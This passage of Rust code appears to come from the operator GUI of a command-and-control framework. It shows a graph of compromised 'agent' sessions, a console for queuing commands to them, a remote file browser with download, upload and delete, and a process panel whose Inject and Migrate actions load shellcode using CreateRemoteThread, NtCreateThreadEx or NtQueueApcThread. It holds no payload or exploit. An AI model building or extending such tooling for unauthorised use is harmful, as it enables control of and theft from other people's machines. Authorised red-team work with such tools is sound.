            self.render_script_list_panel(&mut columns[0], &runtime, &scripts);
            self.render_script_output_panel(&mut columns[1], &output);
        });
    }

    fn render_script_list_panel(
        &mut self,
        ui: &mut egui::Ui,
        runtime: &PythonRuntime,
        scripts: &[ScriptDescriptor],
    ) {
        ui.heading("Loaded Scripts");
        ui.separator();

        if scripts.is_empty() {
            ui.label("No Python scripts are loaded yet.");
            return;
        }

        egui::ScrollArea::vertical().id_salt("python-script-list").max_height(300.0).show(
            ui,
            |ui| {
                for script in scripts {
                    let selected = self.session_panel.script_manager.selected_script.as_deref()
                        == Some(script.name.as_str());
                    egui::Frame::default()
                        .fill(if selected {
                            Color32::from_rgba_unmultiplied(110, 199, 141, 28)
                        } else {
                            Color32::from_rgba_unmultiplied(255, 255, 255, 6)
                        })
                        .stroke(Stroke::new(
                            1.0,
                            Color32::from_rgba_unmultiplied(255, 255, 255, 18),
                        ))
                        .inner_margin(egui::Margin::symmetric(8, 8))
                        .show(ui, |ui| {
                            ui.horizontal_wrapped(|ui| {
                                if ui.selectable_label(selected, &script.name).clicked() {
                                    self.session_panel.script_manager.selected_script =
                                        Some(script.name.clone());
                                }
                                ui.separator();
                                ui.colored_label(
                                    script_status_color(script.status),
                                    script_status_label(script.status),
                                );
                                ui.separator();
                                ui.label(format!("{} cmds", script.registered_command_count));
                            });
                            ui.add_space(2.0);
                            ui.monospace(script.path.display().to_string());
                            if let Some(error) = &script.error {
                                ui.add_space(4.0);
                                ui.colored_label(Color32::from_rgb(215, 83, 83), error);
                            }
                            ui.add_space(6.0);
                            ui.horizontal(|ui| {
                                if ui
                                    .add_enabled(
                                        script.status != ScriptLoadStatus::Loaded,
                                        egui::Button::new("Load"),
                                    )
                                    .clicked()
                                {
                                    self.apply_script_action(
                                        runtime,
                                        ScriptManagerAction::Load(script.path.clone()),
                                    );
                                }
                                if ui.small_button("Reload").clicked() {
                                    self.apply_script_action(
                                        runtime,
                                        ScriptManagerAction::Reload(script.name.clone()),
                                    );
                                }
                                if ui
                                    .add_enabled(
                                        script.status != ScriptLoadStatus::Unloaded,
                                        egui::Button::new("Unload"),
                                    )
                                    .clicked()
                                {
                                    self.apply_script_action(
                                        runtime,
                                        ScriptManagerAction::Unload(script.name.clone()),
                                    );
                                }
                            });
                        });
                    ui.add_space(6.0);
                }
            },
        );
    }

    fn render_script_output_panel(&self, ui: &mut egui::Ui, output: &[ScriptOutputEntry]) {
        ui.heading("Script Output");
        ui.separator();

        egui::ScrollArea::vertical()
            .id_salt("python-script-output")
            .stick_to_bottom(true)
            .max_height(300.0)
            .show(ui, |ui| {
                if output.is_empty() {
                    ui.label("No script output captured yet.");
                    return;
                }

                for entry in output {
                    ui.group(|ui| {
                        ui.horizontal_wrapped(|ui| {
                            ui.monospace(&entry.script_name);
                            ui.separator();
                            ui.colored_label(
                                script_output_color(entry.stream),
                                RichText::new(script_output_label(entry.stream)).monospace(),
                            );
                        });
                        ui.add_space(2.0);
                        ui.label(
                            RichText::new(entry.text.trim_end_matches('\n'))
                                .monospace()
                                .color(script_output_color(entry.stream)),
                        );
                    });
                    ui.add_space(4.0);
                }
            });
    }

    fn apply_script_action(&mut self, runtime: &PythonRuntime, action: ScriptManagerAction) {
        let result = match &action {
            ScriptManagerAction::Load(path) => runtime.load_script(path.clone()),
            ScriptManagerAction::Reload(script_name) => runtime.reload_script(script_name),
            ScriptManagerAction::Unload(script_name) => runtime.unload_script(script_name),
        };

        self.session_panel.script_manager.status_message = Some(match result {
            Ok(()) => match action {
                ScriptManagerAction::Load(path) => {
                    if let Some(script_name) = script_name_for_display(&path) {
                        self.session_panel.script_manager.selected_script = Some(script_name);
                    }
                    format!("Loaded {}.", path.display())
                }
                ScriptManagerAction::Reload(script_name) => {
                    self.session_panel.script_manager.selected_script = Some(script_name.clone());
                    format!("Reloaded {script_name}.")
                }
                ScriptManagerAction::Unload(script_name) => {
                    self.session_panel.script_manager.selected_script = Some(script_name.clone());
                    format!("Unloaded {script_name}.")
                }
            },
            Err(error) => match action {
                ScriptManagerAction::Load(path) => {
                    format!("Failed to load {}: {error}", path.display())
                }
                ScriptManagerAction::Reload(script_name) => {
                    format!("Failed to reload {script_name}: {error}")
                }
                ScriptManagerAction::Unload(script_name) => {
                    format!("Failed to unload {script_name}: {error}")
                }
            },
        });
    }

    fn prune_selected_script(&mut self, scripts: &[ScriptDescriptor]) {
        if self
            .session_panel
            .script_manager
            .selected_script
            .as_ref()
            .is_some_and(|selected| scripts.iter().any(|script| &script.name == selected))
        {
            return;
        }

        self.session_panel.script_manager.selected_script =
            scripts.first().map(|script| script.name.clone());
    }

    fn render_session_graph_panel(&mut self, ui: &mut egui::Ui, state: &AppState) {
        ui.horizontal_wrapped(|ui| {
            ui.heading("Session Graph");
            ui.separator();
            ui.label("Drag to pan, scroll to zoom.");
            if ui.button("Reset View").clicked() {
                self.session_panel.graph_state = SessionGraphState::default();
            }
        });
        ui.add_space(6.0);

        let layout = build_session_graph(&state.agents);
        let desired_size = egui::vec2(ui.available_width(), SESSION_GRAPH_HEIGHT);
        let (rect, response) = ui.allocate_exact_size(desired_size, Sense::click_and_drag());
        let painter = ui.painter_at(rect);

        painter.rect_filled(rect, 10.0, Color32::from_rgb(18, 20, 24));
        painter.rect_stroke(
            rect,
            10.0,
            Stroke::new(1.0, Color32::from_rgba_unmultiplied(255, 255, 255, 24)),
            egui::StrokeKind::Middle,
        );

        if response.dragged() {
            self.session_panel.graph_state.pan += ui.input(|input| input.pointer.delta());
            ui.ctx().request_repaint();
        }

        if response.hovered() {
            let scroll_delta = ui.input(|input| input.raw_scroll_delta.y);
            if scroll_delta.abs() > f32::EPSILON {
                let old_zoom = self.session_panel.graph_state.zoom;
                let zoom_factor = (1.0 + scroll_delta * 0.0015).clamp(0.8, 1.25);
                let new_zoom =
                    (old_zoom * zoom_factor).clamp(SESSION_GRAPH_MIN_ZOOM, SESSION_GRAPH_MAX_ZOOM);
                if (new_zoom - old_zoom).abs() > f32::EPSILON {
                    if let Some(pointer_pos) = response.hover_pos() {
                        let local = pointer_pos - rect.center();
                        self.session_panel.graph_state.pan = local
                            - (local - self.session_panel.graph_state.pan) * (new_zoom / old_zoom);
                    }
                    self.session_panel.graph_state.zoom = new_zoom;
                    ui.ctx().request_repaint();
                }
            }
        }

        let hovered_node = response.hover_pos().and_then(|pointer| {
            layout
                .nodes
                .iter()
                .find(|node| {
                    session_graph_node_rect(
                        rect,
                        &self.session_panel.graph_state,
                        node.position,
                        node.size,
                    )
                    .contains(pointer)
                })
                .map(|node| node.id.clone())
        });

        if hovered_node.is_some() {
            ui.ctx().set_cursor_icon(egui::CursorIcon::PointingHand);
        }

        if response.clicked()
            && let (Some(pointer), Some(node_id)) =
                (response.interact_pointer_pos(), hovered_node.clone())
            && node_id != SESSION_GRAPH_ROOT_ID
            && session_graph_node_rect(
                rect,
                &self.session_panel.graph_state,
                graph_node_position(&layout, &node_id).unwrap_or(Pos2::ZERO),
                graph_node_size(&layout, &node_id).unwrap_or(egui::Vec2::ZERO),
            )
            .contains(pointer)
        {
            self.handle_session_action(
                SessionAction::OpenConsole(node_id),
                state.operator_info.as_ref().map(|operator| operator.username.as_str()),
            );
        }

        for edge in &layout.edges {
            let Some(from) = graph_node_position(&layout, &edge.from) else {
                continue;
            };
            let Some(to) = graph_node_position(&layout, &edge.to) else {
                continue;
            };
            let from_size = graph_node_size(&layout, &edge.from).unwrap_or(egui::Vec2::ZERO);
            let to_size = graph_node_size(&layout, &edge.to).unwrap_or(egui::Vec2::ZERO);
            let start = session_graph_world_to_screen(
                rect,
                &self.session_panel.graph_state,
                Pos2::new(from.x, from.y + from_size.y * 0.5),
            );
            let end = session_graph_world_to_screen(
                rect,
                &self.session_panel.graph_state,
                Pos2::new(to.x, to.y - to_size.y * 0.5),
            );
            let mid_y = (start.y + end.y) * 0.5;
            painter.line_segment(
                [start, Pos2::new(start.x, mid_y)],
                Stroke::new(2.0, Color32::from_rgb(92, 112, 140)),
            );
            painter.line_segment(
                [Pos2::new(start.x, mid_y), Pos2::new(end.x, mid_y)],
                Stroke::new(2.0, Color32::from_rgb(92, 112, 140)),
            );
            painter.line_segment(
                [Pos2::new(end.x, mid_y), end],
                Stroke::new(2.0, Color32::from_rgb(92, 112, 140)),
            );
        }

        for node in &layout.nodes {
            let node_rect = session_graph_node_rect(
                rect,
                &self.session_panel.graph_state,
                node.position,
                node.size,
            );
            let fill = match node.kind {
                SessionGraphNodeKind::Teamserver => Color32::from_rgb(36, 84, 122),
                SessionGraphNodeKind::Agent => session_graph_status_color(&node.status),
            };
            let stroke_color = if hovered_node.as_deref() == Some(node.id.as_str()) {
                Color32::WHITE
            } else {
                Color32::from_rgba_unmultiplied(255, 255, 255, 56)
            };
            painter.rect_filled(node_rect, 8.0, fill);
            painter.rect_stroke(
                node_rect,
                8.0,
                Stroke::new(1.5, stroke_color),
                egui::StrokeKind::Middle,
            );
            painter.text(
                Pos2::new(node_rect.center().x, node_rect.center().y - 10.0),
                Align2::CENTER_CENTER,
                &node.title,
                FontId::proportional(16.0),
                Color32::WHITE,
            );
            painter.text(
                Pos2::new(node_rect.center().x, node_rect.center().y + 10.0),
                Align2::CENTER_CENTER,
                &node.subtitle,
                FontId::monospace(13.0),
                Color32::from_rgb(228, 232, 237),
            );
        }

        let legend_rect =
            Rect::from_min_size(rect.left_top() + egui::vec2(12.0, 12.0), egui::vec2(210.0, 48.0));
        painter.rect_filled(legend_rect, 8.0, Color32::from_rgba_unmultiplied(8, 10, 14, 190));
        painter.circle_filled(
            legend_rect.left_center() + egui::vec2(18.0, -10.0),
            5.0,
            Color32::from_rgb(84, 170, 110),
        );
        painter.text(
            legend_rect.left_center() + egui::vec2(30.0, -10.0),
            Align2::LEFT_CENTER,
            "Alive",
            FontId::proportional(13.0),
            Color32::WHITE,
        );
        painter.circle_filled(
            legend_rect.left_center() + egui::vec2(88.0, -10.0),
            5.0,
            Color32::from_rgb(174, 68, 68),
        );
        painter.text(
            legend_rect.left_center() + egui::vec2(100.0, -10.0),
            Align2::LEFT_CENTER,
            "Dead",
            FontId::proportional(13.0),
            Color32::WHITE,
        );
        painter.circle_filled(
            legend_rect.left_center() + egui::vec2(150.0, -10.0),
            5.0,
            Color32::from_rgb(36, 84, 122),
        );
        painter.text(
            legend_rect.left_center() + egui::vec2(162.0, -10.0),
            Align2::LEFT_CENTER,
            "Root",
            FontId::proportional(13.0),
            Color32::WHITE,
        );

        if layout.nodes.len() == 1 {
            painter.text(
                rect.center_bottom() + egui::vec2(0.0, -18.0),
                Align2::CENTER_CENTER,
                "No agent topology available yet.",
                FontId::proportional(15.0),
                Color32::from_gray(170),
            );
        }
    }

    fn render_console_tabs(&mut self, ui: &mut egui::Ui) {
        let mut close_agent = None;

        ui.horizontal_wrapped(|ui| {
            for agent_id in self.session_panel.open_consoles.clone() {
                let selected = self.session_panel.selected_console.as_deref() == Some(&agent_id);
                ui.group(|ui| {
                    ui.horizontal(|ui| {
                        if ui.selectable_label(selected, &agent_id).clicked() {
                            self.session_panel.selected_console = Some(agent_id.clone());
                        }
                        if ui.small_button("x").clicked() {
                            close_agent = Some(agent_id.clone());
                        }
                    });
                });
            }
        });

        if let Some(agent_id) = close_agent {
            self.session_panel.close_console(&agent_id);
        }
    }

    fn render_single_console(&mut self, ui: &mut egui::Ui, state: &AppState, agent_id: &str) {
        let agent = state.agents.iter().find(|agent| agent.name_id == agent_id);
        let entries = state.agent_consoles.get(agent_id).map(Vec::as_slice).unwrap_or(&[]);
        let browser = state.file_browsers.get(agent_id);
        let process_list = state.process_lists.get(agent_id);
        let status_message = self
            .session_panel
            .console_state
            .get(agent_id)
            .and_then(|console| console.status_message.clone());

        egui::Frame::default()
            .fill(Color32::from_rgba_unmultiplied(255, 255, 255, 6))
            .stroke(Stroke::new(1.0, Color32::from_rgba_unmultiplied(255, 255, 255, 18)))
            .inner_margin(egui::Margin::symmetric(10, 10))
            .show(ui, |ui| {
                if let Some(agent) = agent {
                    ui.horizontal_wrapped(|ui| {
                        ui.label(RichText::new(&agent.name_id).strong().monospace());
                        ui.separator();
                        ui.label(RichText::new(&agent.hostname).strong());
                        ui.separator();
                        ui.label(format!("{}\\{}", agent.domain_name, agent.username));
                        ui.separator();
                        ui.label(format!("PID {}", agent.process_pid));
                        ui.separator();
                        ui.label(&agent.process_name);
                        ui.separator();
                        ui.label(format!("Status: {}", agent.status));
                    });
                    ui.add_space(4.0);
                    ui.label(
                        RichText::new(format!(
                            "{} | {} | {}",
                            blank_if_empty(&agent.internal_ip, &agent.external_ip),
                            agent_os(agent),
                            agent_arch(agent)
                        ))
                        .weak(),
                    );
                    if !agent.note.trim().is_empty() {
                        ui.add_space(4.0);
                        ui.label(RichText::new(format!("Note: {}", agent.note)).weak());
                    }
                } else {
                    ui.label(
                        RichText::new(format!("Agent {agent_id} is no longer present")).weak(),
                    );
                }

                if let Some(message) = &status_message {
                    ui.add_space(6.0);
                    ui.colored_label(Color32::from_rgb(232, 182, 83), message);
                }

                ui.add_space(8.0);
                ui.separator();
                ui.add_space(8.0);

                ui.columns(2, |columns| {
                    self.render_file_browser_panel(&mut columns[0], agent_id, browser);
                    self.render_console_output_panel(&mut columns[1], agent_id, entries);
                });

                ui.add_space(8.0);
                self.render_console_input(ui, agent_id);

                ui.add_space(12.0);
                ui.separator();
                ui.add_space(8.0);
                self.render_process_panel(ui, agent, agent_id, process_list);
            });
    }

    fn render_console_output_panel(
        &self,
        ui: &mut egui::Ui,
        agent_id: &str,
        entries: &[AgentConsoleEntry],
    ) {
        ui.heading("Console Output");
        ui.separator();
        egui::ScrollArea::vertical()
            .id_salt(("console-output", agent_id))
            .stick_to_bottom(true)
            .max_height(360.0)
            .show(ui, |ui| {
                if entries.is_empty() {
                    ui.label("No console output for this session yet.");
                } else {
                    for entry in entries {
                        self.render_console_entry(ui, entry);
                        ui.add_space(4.0);
                    }
                }
            });
    }

    fn render_file_browser_panel(
        &mut self,
        ui: &mut egui::Ui,
        agent_id: &str,
        browser: Option<&AgentFileBrowserState>,
    ) {
        ui.heading("File Browser");
        ui.separator();

        let current_dir = browser
            .and_then(|state| state.current_dir.clone())
            .or_else(|| browser.and_then(|state| state.directories.keys().next().cloned()));
        let loaded_paths = browser.map(|state| &state.directories);
        let operator = self.current_operator_username();
        {
            let ui_state = self.session_panel.file_browser_state_mut(agent_id);
            if let Some(browser) = browser {
                ui_state.pending_dirs.retain(|path| !browser.directories.contains_key(path));
            }
            if let Some(root) = current_dir.clone() {
                if loaded_paths.is_none_or(|paths| !paths.contains_key(&root))
                    && !ui_state.pending_dirs.contains(&root)
                {
                    let message = build_file_browser_list_task(agent_id, &root, &operator);
                    ui_state.pending_dirs.insert(root.clone());
                    ui_state.status_message = Some(format!("Queued listing for {root}."));
                    self.session_panel.pending_messages.push(message);
                }
            }
        }

        ui.horizontal_wrapped(|ui| {
            ui.label("Current");
            ui.monospace(current_dir.as_deref().unwrap_or("unknown"));

            if ui.button("Resolve cwd").clicked() {
                self.queue_file_browser_pwd(agent_id);
            }
            if ui.button("Refresh").clicked() {
                if let Some(path) = current_dir.as_deref() {
                    self.queue_file_browser_list(agent_id, path);
                }
            }
            if ui.button("Up").clicked() {
                if let Some(path) = current_dir.as_deref().and_then(parent_remote_path) {
                    self.queue_file_browser_cd(agent_id, &path);
                    self.queue_file_browser_list(agent_id, &path);
                }
            }
        });

        let browser_status = browser.and_then(|state| state.status_message.as_deref());
        let ui_status = self
            .session_panel
            .file_browser_state
            .get(agent_id)
            .and_then(|state| state.status_message.as_deref());
        if let Some(message) = ui_status.or(browser_status) {
            ui.add_space(4.0);
            ui.label(RichText::new(message).weak());
        }

        ui.add_space(6.0);
        ui.horizontal_wrapped(|ui| {
            let selected_path = self
                .session_panel
                .file_browser_state
                .get(agent_id)
                .and_then(|state| state.selected_path.clone());
            let selected_entry = browser.and_then(|state| {
                selected_path.as_deref().and_then(|path| find_file_entry(state, path))
            });
            let selected_directory = selected_remote_directory(browser, selected_path.as_deref());

            if ui
                .add_enabled(selected_directory.is_some(), egui::Button::new("Set Working Dir"))
                .clicked()
                && let Some(path) = selected_directory.as_deref()
            {
                self.queue_file_browser_cd(agent_id, path);
                self.queue_file_browser_list(agent_id, path);
            }

            if ui
                .add_enabled(
                    selected_entry.is_some_and(|entry| !entry.is_dir),
                    egui::Button::new("Download"),
                )
                .clicked()
            {
                if let Some(path) = selected_path.as_deref() {
                    self.queue_file_browser_download(agent_id, path);
                }
            }

            if ui.button("Upload").clicked() {
                self.queue_file_browser_upload(
                    agent_id,
                    upload_destination(browser, selected_path.as_deref()),
                );
            }

            if ui.add_enabled(selected_path.is_some(), egui::Button::new("Delete")).clicked() {
                if let Some(path) = selected_path.as_deref() {
                    self.queue_file_browser_delete(agent_id, path);
                }
            }
        });

        ui.add_space(6.0);
        if let Some(browser) = browser {
            if let Some(root) = current_dir.as_deref() {
                self.render_directory_tree(ui, agent_id, browser, root, 0);
            } else {
                ui.label("Request the current working directory to initialize the browser.");
            }

            if !browser.downloads.is_empty() {
                ui.add_space(8.0);
                ui.label(RichText::new("Downloads").strong());
                for progress in browser.downloads.values() {
                    let denominator = progress.expected_size.max(1) as f32;
                    let fraction = (progress.current_size as f32 / denominator).clamp(0.0, 1.0);
                    ui.add(egui::ProgressBar::new(fraction).text(format!(
                        "{} [{} / {}]",
                        progress.remote_path,
                        human_size(progress.current_size),
                        human_size(progress.expected_size)
                    )));
                }
            }
        } else {
            ui.label("No filesystem state has been received for this agent yet.");
        }
    }

    fn render_directory_tree(
        &mut self,
        ui: &mut egui::Ui,
        agent_id: &str,
        browser: &AgentFileBrowserState,
        path: &str,
        depth: usize,
    ) {
        let label = directory_label(path);
        let response = egui::CollapsingHeader::new(label)
            .id_salt(("file-browser-dir", agent_id, path))
            .default_open(depth == 0)
            .show(ui, |ui| {
                if let Some(entries) = browser.directories.get(path) {
                    if entries.is_empty() {
                        ui.label("Directory is empty.");
                    } else {
                        for entry in entries {
                            if entry.is_dir {
                                self.render_directory_tree(
                                    ui,
                                    agent_id,
                                    browser,
                                    &entry.path,
                                    depth + 1,
                                );
                            } else {
                                let selected = self
                                    .session_panel
                                    .file_browser_state
                                    .get(agent_id)
                                    .and_then(|state| state.selected_path.as_deref())
                                    == Some(entry.path.as_str());
                                if ui.selectable_label(selected, file_entry_label(entry)).clicked()
                                {
                                    self.session_panel
                                        .file_browser_state_mut(agent_id)
                                        .selected_path = Some(entry.path.clone());
                                }
                            }
                        }
                    }
                } else {
                    ui.label("Waiting for directory listing...");
                }
            });

        if response.header_response.clicked() {
            self.session_panel.file_browser_state_mut(agent_id).selected_path =
                Some(path.to_owned());
        }

        if response.fully_open() && !browser.directories.contains_key(path) {
            let operator = self.current_operator_username();
            let ui_state = self.session_panel.file_browser_state_mut(agent_id);
            if !ui_state.pending_dirs.contains(path) {
                let message = build_file_browser_list_task(agent_id, path, &operator);
                ui_state.pending_dirs.insert(path.to_owned());
                ui_state.status_message = Some(format!("Queued listing for {path}."));
                self.session_panel.pending_messages.push(message);
            }
        }
    }

    fn render_console_entry(&self, ui: &mut egui::Ui, entry: &AgentConsoleEntry) {
        let accent = match entry.kind {
            AgentConsoleEntryKind::Output => Color32::from_rgb(110, 199, 141),
            AgentConsoleEntryKind::Error => Color32::from_rgb(215, 83, 83),
        };

        ui.group(|ui| {
            ui.horizontal_wrapped(|ui| {
                let timestamp = blank_if_empty(&entry.received_at, "pending");
                ui.label(RichText::new(timestamp).weak().monospace());
                ui.separator();
                ui.colored_label(accent, RichText::new(&entry.command_id).monospace());
                if let Some(command_line) = &entry.command_line {
                    if !command_line.trim().is_empty() {
                        ui.separator();
                        ui.label(RichText::new(command_line).monospace().weak());
                    }
                }
            });
            ui.add_space(2.0);
            ui.label(RichText::new(&entry.output).monospace().color(accent));
        });
    }

    fn render_console_input(&mut self, ui: &mut egui::Ui, agent_id: &str) {
        let mut run_command = false;

        ui.horizontal(|ui| {
            ui.label(RichText::new(">").strong().monospace());
            let response = {
                let console = self.session_panel.console_state_mut(agent_id);
                ui.add(
                    egui::TextEdit::singleline(&mut console.input)
                        .id_source(("console-input", agent_id))
                        .desired_width(f32::INFINITY)
                        .hint_text("Enter a Demon command"),
                )
            };

            let send_requested =
                response.lost_focus() && ui.input(|input| input.key_pressed(Key::Enter));
            let tab_pressed = response.has_focus() && ui.input(|input| input.key_pressed(Key::Tab));
            let up_pressed =
                response.has_focus() && ui.input(|input| input.key_pressed(Key::ArrowUp));
            let down_pressed =
                response.has_focus() && ui.input(|input| input.key_pressed(Key::ArrowDown));

            if up_pressed {
                let console = self.session_panel.console_state_mut(agent_id);
                apply_history_step(console, HistoryDirection::Older);
                response.request_focus();
            } else if down_pressed {
                let console = self.session_panel.console_state_mut(agent_id);
                apply_history_step(console, HistoryDirection::Newer);
                response.request_focus();
            } else if tab_pressed {
                let console = self.session_panel.console_state_mut(agent_id);
                apply_completion(console);
                response.request_focus();
            }

            if response.changed() {
                let console = self.session_panel.console_state_mut(agent_id);
                console.completion_index = 0;
                console.completion_seed = None;
            }

            run_command = ui.button("Run").clicked() || send_requested;
        });

        if run_command {
            self.submit_console_command(agent_id);
        }
    }

    fn render_process_panel(
        &mut self,
        ui: &mut egui::Ui,
        agent: Option<&transport::AgentSummary>,
        agent_id: &str,
        process_list: Option<&AgentProcessListState>,
    ) {
        ui.heading("Process List");
        ui.separator();

        let current_pid = agent.and_then(|entry| entry.process_pid.trim().parse::<u32>().ok());
        let process_status = self
            .session_panel
            .process_state
            .get(agent_id)
            .and_then(|state| state.status_message.clone())
            .or_else(|| process_list.and_then(|state| state.status_message.clone()));

        ui.horizontal_wrapped(|ui| {
            ui.label("Filter");
            let filter = &mut self.session_panel.process_state_mut(agent_id).filter;
            ui.add(
                egui::TextEdit::singleline(filter)
                    .desired_width(180.0)
                    .hint_text("Search name or PID"),
            );

            if ui.button("Refresh").clicked() {
                self.queue_process_refresh(agent_id);
            }

            if let Some(updated_at) = process_list.and_then(|state| state.updated_at.as_deref()) {
                ui.separator();
                ui.label(RichText::new(format!("Updated {updated_at}")).weak());
            }

            if let Some(pid) = current_pid {
                ui.separator();
                ui.label(RichText::new(format!("Agent PID {pid}")).weak());
            }
        });

        if let Some(message) = process_status {
            ui.add_space(4.0);
            ui.label(RichText::new(message).weak());
        }
        ui.add_space(6.0);

        let Some(process_list) = process_list else {
            ui.label("No process list has been received for this agent yet.");
            return;
        };

        let filter = self
            .session_panel
            .process_state
            .get(agent_id)
            .map(|state| state.filter.as_str())
            .unwrap_or_default();
        let rows = filtered_process_rows(&process_list.rows, filter);
        if rows.is_empty() {
            ui.label("No processes match the current filter.");
            return;
        }

        egui::Grid::new(("process-table-header", agent_id))
            .num_columns(7)
            .spacing([10.0, 6.0])
            .show(ui, |ui| {
                ui.strong("PID");
                ui.strong("PPID");
                ui.strong("Name");
                ui.strong("Arch");
                ui.strong("User");
                ui.strong("Session");
                ui.strong("Actions");
                ui.end_row();
            });
        ui.separator();

        egui::ScrollArea::vertical().id_salt(("process-table", agent_id)).max_height(240.0).show(
            ui,
            |ui| {
                for row in rows {
                    let highlight = current_pid == Some(row.pid);
                    egui::Frame::default()
                        .fill(if highlight {
                            Color32::from_rgba_unmultiplied(110, 199, 141, 40)
                        } else {
                            Color32::TRANSPARENT
                        })
                        .inner_margin(egui::Margin::symmetric(6, 4))
                        .show(ui, |ui| {
                            egui::Grid::new(("process-row", agent_id, row.pid))
                                .num_columns(7)
                                .spacing([10.0, 4.0])
                                .show(ui, |ui| {
                                    ui.monospace(row.pid.to_string());
                                    ui.monospace(row.ppid.to_string());
                                    ui.label(&row.name);
                                    ui.label(&row.arch);
                                    ui.label(blank_if_empty(&row.user, "unknown"));
                                    ui.label(row.session.to_string());
                                    ui.horizontal_wrapped(|ui| {
                                        if ui.small_button("Kill").clicked() {
                                            self.queue_process_kill(agent_id, row.pid);
                                        }
                                        if ui.small_button("Inject").clicked() {
                                            self.open_process_injection_dialog(
                                                agent_id,
                                                row,
                                                InjectionTargetAction::Inject,
                                            );
                                        }
                                        if ui.small_button("Migrate").clicked() {
                                            self.open_process_injection_dialog(
                                                agent_id,
                                                row,
                                                InjectionTargetAction::Migrate,
                                            );
                                        }
                                    });
                                    ui.end_row();
                                });
                        });
                    ui.add_space(2.0);
                }
            },
        );
    }

    fn open_process_injection_dialog(
        &mut self,
        agent_id: &str,
        row: &ProcessEntry,
        action: InjectionTargetAction,
    ) {
        self.session_panel.process_injection = Some(ProcessInjectionDialogState {
            agent_id: agent_id.to_owned(),
            pid: row.pid,
            process_name: row.name.clone(),
            arch: row.arch.clone(),
            action,
            technique: InjectionTechnique::Default,
            shellcode_path: String::new(),
            arguments: String::new(),
            status_message: None,
        });
    }

    fn render_process_injection_dialog(&mut self, ctx: &egui::Context) {
        let Some(dialog) = &mut self.session_panel.process_injection else {
            return;
        };

        let mut keep_open = true;
        let mut queue_task = false;
        let mut cancel = false;

        egui::Window::new(format!("{} {}", dialog.action.label(), dialog.process_name))
            .collapsible(false)
            .resizable(true)
            .default_size([480.0, 220.0])
            .open(&mut keep_open)
            .show(ctx, |ui| {
                ui.label(format!(
                    "{} into PID {} ({}, {})",
                    dialog.action.label(),
                    dialog.pid,
                    dialog.process_name,
                    dialog.arch
                ));
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    ui.label("Technique");
                    egui::ComboBox::from_id_salt((
                        "inject-technique",
                        dialog.agent_id.as_str(),
                        dialog.pid,
                    ))
                    .selected_text(match dialog.technique {
                        InjectionTechnique::Default => "Default",
                        InjectionTechnique::CreateRemoteThread => "CreateRemoteThread",
                        InjectionTechnique::NtCreateThreadEx => "NtCreateThreadEx",
                        InjectionTechnique::NtQueueApcThread => "NtQueueApcThread",
                    })
                    .show_ui(ui, |ui| {
                        for (value, label) in InjectionTechnique::ALL {
                            ui.selectable_value(&mut dialog.technique, value, label);
                        }
                    });
                });
                ui.add_space(6.0);
                ui.horizontal(|ui| {
                    ui.label("Shellcode");
                    ui.add(
                        egui::TextEdit::singleline(&mut dialog.shellcode_path)
                            .desired_width(260.0)
                            .hint_text("/path/to/payload.bin"),
                    );
                    if ui.button("Browse").clicked() {
                        if let Some(path) = FileDialog::new().pick_file() {
                            dialog.shellcode_path = path.display().to_string();
                        }
                    }
                });
                ui.add_space(6.0);
                ui.label("Arguments");
                ui.add(
                    egui::TextEdit::singleline(&mut dialog.arguments)
                        .desired_width(f32::INFINITY)
                        .hint_text("Optional arguments passed to the payload"),
                );
                if let Some(message) = &dialog.status_message {
                    ui.add_space(6.0);
                    ui.label(RichText::new(message).weak());
                }
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    if ui.button(dialog.action.label()).clicked() {
                        queue_task = true;
                    }
                    if ui.button("Cancel").clicked() {
                        cancel = true;
                    }
                });
            });

        if queue_task {
            self.submit_process_injection();
            ctx.request_repaint();
        } else if cancel || !keep_open {
            self.session_panel.process_injection = None;
        }
    }

    fn render_note_editor(&mut self, ctx: &egui::Context, app_state: &SharedAppState) {
        let Some(editor) = &mut self.session_panel.note_editor else {
            return;
        };

        let mut keep_open = true;
        let mut save_note = false;
        let mut cancel_note = false;
        let title = format!("Agent Note {}", editor.agent_id);
        egui::Window::new(title)
            .collapsible(false)
            .resizable(true)
            .default_size([420.0, 220.0])
            .open(&mut keep_open)
            .show(ctx, |ui| {
                ui.label("Operator note");
                ui.add(
                    egui::TextEdit::multiline(&mut editor.note)
                        .desired_rows(8)
                        .hint_text("Add operator context for this agent"),
                );
                ui.add_space(8.0);
                ui.horizontal(|ui| {
                    if ui.button("Save").clicked() {
                        save_note = true;
                    }
                    if ui.button("Cancel").clicked() {
                        cancel_note = true;
                    }
                });
            });

        if save_note {
            let agent_id = editor.agent_id.clone();
            let note = editor.note.trim().to_owned();
            let operator = match app_state.lock() {
                Ok(mut state) => {
                    state.update_agent_note(&agent_id, note.clone());
                    state
                        .operator_info
                        .as_ref()
                        .map(|operator| operator.username.clone())
                        .unwrap_or_default()
                }
                Err(poisoned) => {
                    let mut state = poisoned.into_inner();
                    state.update_agent_note(&agent_id, note.clone());
                    state
                        .operator_info
                        .as_ref()
                        .map(|operator| operator.username.clone())
                        .unwrap_or_default()
                }
            };
            self.session_panel.pending_messages.push(build_note_task(&agent_id, &note, &operator));
            self.session_panel.status_message = Some(format!("Updated note for {agent_id}."));
            self.session_panel.note_editor = None;
            ctx.request_repaint();
        } else if cancel_note || !keep_open {
            self.session_panel.note_editor = None;
        }
    }

    fn submit_console_command(&mut self, agent_id: &str) {
        let operator = self.current_operator_username();
        let python_runtime = self.python_runtime.clone();

        let console = self.session_panel.console_state_mut(agent_id);
        let command_line = console.input.trim().to_owned();
        if command_line.is_empty() {
            return;
        }

        if let Some(runtime) = python_runtime {
            match runtime.execute_registered_command(agent_id, &command_line) {
                Ok(true) => {
                    push_history_entry(console, &command_line);
                    console.input.clear();
                    console.status_message =
                        Some(format!("Executed script command `{command_line}`."));
                    return;
                }
                Ok(false) => {}
                Err(error) => {
                    console.status_message =
                        Some(format!("Script command `{command_line}` failed: {error}"));
                    return;
                }
            }
        }

        match build_console_task(agent_id, &command_line, &operator) {
            Ok(message) => {
                push_history_entry(console, &command_line);
                console.input.clear();
                console.status_message = Some(format!("Queued `{command_line}`."));
                self.session_panel.pending_messages.push(message);
            }
            Err(error) => {
                console.status_message = Some(error);
            }
        }
    }

    fn current_operator_username(&self) -> String {
        match &self.phase {
            AppPhase::Connected { app_state, .. } | AppPhase::Authenticating { app_state, .. } => {
                let snapshot = Self::snapshot(app_state);
                snapshot.operator_info.map(|info| info.username).unwrap_or_default()
            }
            AppPhase::Login(_) => String::new(),
        }
    }

